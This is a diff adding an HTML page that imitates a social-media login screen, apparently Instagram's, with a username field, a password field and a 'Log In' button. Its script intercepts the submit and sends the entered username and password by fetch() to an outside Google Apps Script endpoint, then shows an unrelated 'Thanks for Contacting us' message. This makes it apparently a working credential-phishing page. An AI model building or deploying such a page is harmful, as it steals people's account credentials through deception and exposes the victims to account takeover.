@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+<style>
+    *{
+        margin: 0px;
+        padding: 0px;
+    }
+    body{
+        background-color:#eee;
+    }
+#border_q{
+    width: fit-content;
+    padding: 1cm 2cm 1cm 2cm;
+    margin: auto;
+    margin-top: 150px;
+    border: solid;
+    border-width:0px;
+    background-color: #fff
+ 
+
+}
+.input_first{
+    width: 250px;
+  margin-bottom: 5px;
+  padding: 8px 12px;
+  border: 1px solid #dbdbdb;
+  box-sizing: border-box;
+  border-radius: 3px;
+}
+#btn_d{
+    width: 250px;
+    height: 30px;
+    background-color: #3897f0;
+    border-width: 0px;
+    color: white;
+    font-weight: bolder;
+    font-size: 15px;
+ cursor: pointer;
+}
+.no_accnt{
+    border: solid 0px;
+    background-color: #fff;
+    text-align: center;
+    margin: auto;
+    margin-top: 40px;
+    padding: 4mm;
+    height: fit-content;
+    width: 370px;
+}
+</style>
+           
+</head>
+<body>
+<div class="main" id="main_id">
+    <div class="form" id="form_id">
+        <div class="border" id="border_q">
+        <form action="" method="post" name="google-sheet">
+                <div class="img">
+                    <img src="https://i.imgur.com/zqpwkLQ.png" alt="img" class="first_img">
+                </div>
+                <div class="user_name" id="user_name_id">
+                    <input type="text" placeholder="username" name="name" id="input_first_id" class="input_first" autocomplete="" required value="" >
+                </div>
+                <div class="user_name" id="user_name_id_q">
+                   
+                    <input type="text" placeholder="password" name="password" autocomplete="" required value="" id="input_second_id" class="input_first">
+                </div>
+                <div class="btn" id="btn_x">
+                    <input type="submit" value="Log In" class="btn" name="sumbit" id="btn_d">
+                </div>
+            </form>
+        </div>
+        <div class="no_accnt" id="no_accnt_id">
+            Don't have an account?<a href="#" class="lnk">Sign up</a>
+        </div>
+    </div>
+</div>
+          
+          <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbw03b-YW3-3co0IdWt_xZxCNxT_-YQi8hfhC4RlN72cJMbqq9uGWp6Uj3y0nBqVwuI/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</body>
+</html>
+            
